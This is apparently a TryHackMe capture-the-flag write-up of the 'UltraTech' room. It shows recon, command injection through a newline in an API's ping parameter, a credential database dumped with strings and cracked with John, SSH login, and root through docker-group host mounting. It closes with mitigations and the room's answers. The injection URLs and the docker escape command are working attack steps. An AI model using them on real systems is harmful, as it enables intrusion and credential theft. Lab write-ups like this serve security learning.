# THM — UltraTech

```
██╗   ██╗██╗  ████████╗██████╗  █████╗ ████████╗███████╗ ██████╗██╗  ██╗
██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔════╝██║  ██║
██║   ██║██║     ██║   ██████╔╝███████║   ██║   █████╗  ██║     ███████║
██║   ██║██║     ██║   ██╔══██╗██╔══██║   ██║   ██╔══╝  ██║     ██╔══██║
╚██████╔╝███████╗██║   ██║  ██║██║  ██║   ██║   ███████╗╚██████╗██║  ██║
 ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
                       TryHackMe — Medium
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 21 (FTP), 22 (SSH), 8081 (Node.js Express API), 31331 (Apache)
- [x] Identified the real website on 31331 and an API (`UltraTech API v0.1.3`) on 8081
- [x] Read `/js/api.js` on the website, which revealed the API's `/ping` route
- [x] Found the API exposes two routes: `/auth` and `/ping`
- [x] Confirmed OS command injection in `/ping?ip=` via a newline (`%0a`)
- [x] Enumerated the box as the `www` user through the injection
- [x] Located `/home/www/api/utech.db.sqlite` and dumped it with `strings` (no `sqlite3` on the box)
- [x] Recovered two MD5 hashes: `r00t` and `admin`
- [x] Cracked the `r00t` hash with John → `n100906`
- [x] SSH in as `r00t`
- [x] Found `r00t` is in the `docker` group
- [x] Escaped to root by mounting the host filesystem inside a container
- [x] Answered every room question

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| feroxbuster | Web content discovery |
| curl | Driving the API and the command injection |
| strings | Reading the SQLite database (no `sqlite3` binary on the target) |
| John the Ripper | Cracking the MD5 hash |
| ssh | Logging in as the cracked user |
| docker | Privilege escalation through the `docker` group |

---

## TL;DR

UltraTech runs a normal-looking marketing site on port 31331 and a small Node.js API on port 8081. A JavaScript file on the website points at the API's `/ping` route, and that route passes its `ip` parameter straight into a shell `ping` command. A newline (`%0a`) in the parameter turns it into arbitrary command execution as the `www` user. From there I read a SQLite database holding two MD5 hashes, cracked the `r00t` one to `n100906`, and used it to SSH in. The `r00t` user is in the `docker` group, so I spun up a container with the host's `/` mounted inside it and read everything as root. Classic `docker` group = root.

---

## Introduction

UltraTech is a medium-rated Linux box built around two web services that only make sense when you read them together. The website on 31331 is just a front; the interesting surface is the API on 8081, and the website's own JavaScript is what tells you the API exists and which routes it has. The whole first half of the box is "read the client-side code, then talk to the API it describes." The second half is one of the most common real-world Linux escalations there is: a non-root user who can talk to the Docker daemon is effectively root already.

---

## Recon

### Port Scan

```bash
rustscan -a 10.48.174.133 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC
```

Four open ports:

| Port | Service | Version |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 8081/tcp | HTTP | Node.js Express framework |
| 31331/tcp | HTTP | Apache httpd 2.4.41 (Ubuntu) |

Two web servers on non-standard ports, plus FTP and SSH. The Express app on 8081 responded with CORS wide open (`Access-Control-Allow-Origin: *`) and supported a long list of methods.

### Web — Port 8081 (the API)

The root of the API named itself:

```bash
curl -s http://10.48.174.133:8081/
# UltraTech API v0.1.3
curl -s http://10.48.174.133:8081/auth
# You must specify a login and a password
```

So there's at least an `/auth` route, and it wants credentials I don't have yet.

### Web — Port 31331 (the website)

Port 31331 is the actual UltraTech marketing site ("BigData, AI and Blockchain experts"). Content discovery:

```bash
feroxbuster -u http://10.48.174.133:31331/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,js,json -s 200,301,302,403 -k --scan-dir-listings
```

The useful hit was a browsable `/js/` directory containing `api.js`, `app.js` and `app.min.js`. `robots.txt` existed but led nowhere interesting.

---

## Foothold

### Reading the website's JavaScript

The directory listing let me read `api.js` directly. It builds the API URL and calls a `/ping` route:

```javascript
function getAPIURL() {
    return `${window.location.hostname}:8081`
}
// ...
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

That's the second route (the first being `/auth`), and it takes an `ip` parameter. A parameter named `ip` that feeds a function called "ping" is almost always a shell call.

### Confirming the `/ping` route

```bash
curl -i "http://10.48.174.133:8081/ping?ip=127.0.0.1"
```

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.050 ms
...
```

The server runs the real `ping` binary with my input and returns its output. That is user input reaching a shell.

### Command injection

A semicolon got mangled, but a URL-encoded newline (`%0a`) broke out cleanly and ran a second command:

```bash
curl -s "http://10.48.174.133:8081/ping?ip=127.0.0.1%0aid"
```

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
uid=1002(www) gid=1002(www) groups=1002(www)
```

Command execution as the `www` user.

---

## Shell / Initial Access

Rather than throw a reverse shell immediately, I enumerated through the injection with `curl`, URL-encoding each command.

```bash
curl -s "http://10.48.174.133:8081/ping?ip=127.0.0.1%0als%20-la%20/home"
```

```
drwxr-xr-x  5 lp1    lp1    4096 Mar 22  2019 lp1
drwxr-xr-x  2 r00t   r00t   4096 Mar 22  2019 r00t
drwxr-xr-x  4 ubuntu ubuntu 4096 Oct 26  2025 ubuntu
drwxr-xr-x  5 www    www    4096 Mar 22  2019 www
```

`r00t` is a real user with a home directory and, from `/etc/passwd`, a `/bin/bash` shell — a likely SSH target if I can find a password.

Hunting for a database:

```bash
curl -s "http://10.48.174.133:8081/ping?ip=127.0.0.1%0afind%20/%20-name%20'*.db'%20-o%20-name%20'*.sqlite*'%202%3E/dev/null"
```

```
/home/www/api/utech.db.sqlite
```

The API's own SQLite database. There's no `sqlite3` binary on the box, but `strings` is enough:

```bash
curl -s "http://10.48.174.133:8081/ping?ip=127.0.0.1%0astrings%20/home/www/api/utech.db.sqlite"
```

```
CREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
        )
r00t  f357a0c52799563c7c7b76c1e7543a32
admin 0d0ea5111e3c1def594c1684e3b9be84
```

Two MD5 hashes. The `r00t` row is the one I want.

### Cracking the hash

```bash
echo 'f357a0c52799563c7c7b76c1e7543a32' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
n100906          (?)
1g 0:00:00:00 DONE ... 
```

`r00t : n100906`.

### SSH

```bash
ssh r00t@10.48.174.133
# password: n100906
r00t@ip-10-48-174-133:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

A real interactive shell as `r00t` — and the `id` output is the whole ballgame: **`groups=...,116(docker)`**.

---

## Escalation Path

`r00t` is a member of the `docker` group. The Docker daemon runs as root, and any member of the `docker` group can tell it to start a container. If you start a container with the host's root filesystem mounted inside it, you are root on that filesystem — no exploit, no password, just the daemon doing exactly what it's designed to do.

```bash
docker images
# bash   latest   495d6437fc1e   7 years ago   15.8MB
```

There's already a `bash` image pulled, so I don't even need to download one.

---

## Exploitation

Mount the host's `/` at `/mnt` inside a throwaway container:

```bash
docker run -v /:/mnt --rm -it bash
```

Inside the container I'm root, and `/mnt` is the real host filesystem. From there I can read anything, including root's SSH key:

```bash
bash-5.0# cat /mnt/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
...（trimmed — full key stays on the box）...
-----END RSA PRIVATE KEY-----
```

(The room asks only for the first nine characters of the key, `MIIEogIBA`; I've trimmed the rest here rather than reprint a private key.)

With root's key, or just by reading files straight off `/mnt`, every flag and answer on the box is available.

---

## Rabbit Holes

**The `/auth` route.** Early on, `/auth` looked like the intended way in, and I spent a little time poking at it with test credentials and both GET and POST. It only returns "Invalid credentials" or a framework 404 for POST. `/auth` is not the foothold — it's there to make you think the API is credential-gated. The way in is the *other* route, `/ping`, which the website's own JavaScript hands you.

**Feroxbuster on port 8081.** Directory brute-forcing the API found only `/` and `/auth` (and case variants). The API has no hidden directories worth chasing; its routes are defined in the client-side JS, not discoverable by path brute force. Reading `api.js` was worth more than the scan.

**Semicolon injection.** My first injection attempt used `;id`, which came back as `ping: 127.0.0.1id: Name or service not known` — the semicolon was swallowed into the ping argument. The newline (`%0a`) is what actually breaks the command apart. When one separator fails, try the others before concluding the input is sanitised.

**hashcat with no GPU.** I reached for `hashcat -m 0` first and it bailed with `No OpenCL / CUDA platform found` — this VM has no GPU runtime. John cracked the same MD5 on CPU in under a second. For a single fast-hash, John on CPU is the quicker path anyway.

---

## Flag

UltraTech is a question-based room rather than a `user.txt` / `root.txt` box. The answers that the chain produces:

| Question | Answer |
|---|---|
| Software behind port 8081 | Node.js (Express) |
| Other non-standard port | 31331 |
| Software behind port 31331 | Apache httpd 2.4.41 |
| GNU/Linux distribution | Ubuntu |
| Number of API routes used by the app | 2 (`/ping`, `/auth`) |
| Database filename | `utech.db.sqlite` |
| First user's password hash | `f357a0c52799563c7c7b76c1e7543a32` |
| Password for that hash | `n100906` |
| First 9 characters of root's private key | `MIIEogIBA` |

---

## Mitigations

**Command injection in `/ping`.** The root cause is user input (`ip`) reaching a shell command. The fix is to never build a shell string from user input: validate `ip` against a strict IPv4/IPv6 pattern and reject anything else, and call `ping` through an argument array (`execFile('ping', ['-c','1', ip])`) rather than a shell so metacharacters like newlines can't inject new commands.

**Secrets reachable from the web user.** The SQLite database of credentials sat in the API's own directory, readable by the `www` service account. Even without the injection, any file-read bug would have leaked it. Credentials should be hashed with a slow, salted algorithm (bcrypt/argon2, not bare MD5) and the datastore should not be world- or service-readable from the web root.

**`docker` group membership.** Putting `r00t` in the `docker` group granted implicit root. Membership in `docker` should be treated as equivalent to `sudo` with no password — only truly privileged admins belong there. Where containers must be managed by less-trusted users, use rootless Docker or a brokered API that constrains what can be mounted.

**MD5 for passwords.** Both stored hashes were unsalted MD5, which fall to a wordlist instantly. Password verification should use bcrypt or argon2id.

---

## Key Takeaway

The foothold here is a reading-comprehension exercise, not a scanning one. The API on 8081 looks locked behind `/auth`, and no amount of directory brute-forcing reveals the way in. The website's own `api.js` is what names the `/ping` route and shows it takes an `ip` parameter — client-side JavaScript is part of the attack surface, and reading it beats fuzzing. Once you have a parameter that is clearly fed to a shell utility, the only question is which separator the filter forgot.

The escalation is the lesson worth memorising cold: **a user in the `docker` group is root.** `docker run -v /:/mnt` mounts the host's entire filesystem into a container you control as root, and nothing stops you reading or writing any file. It's not a vulnerability in Docker — it's the documented trust model — which is exactly why group membership has to be guarded like a root password.

---

## If I Did It Again

Read `api.js` before running feroxbuster, not after. The single most useful artifact on the box is that file, and it's linked from the site's own pages — the directory scan was wasted motion once the JS pointed straight at `/ping`.

On getting any shell as a service user, run `id` first. Here `groups=...,116(docker)` would have told me the escalation path before I'd even looked at the database — I could have planned the whole second half from the first `id` through the injection.

Skip `hashcat` on a GPU-less VM and go straight to `john` for a single fast hash. I lost a few seconds to the OpenCL error for no reason.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-16 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
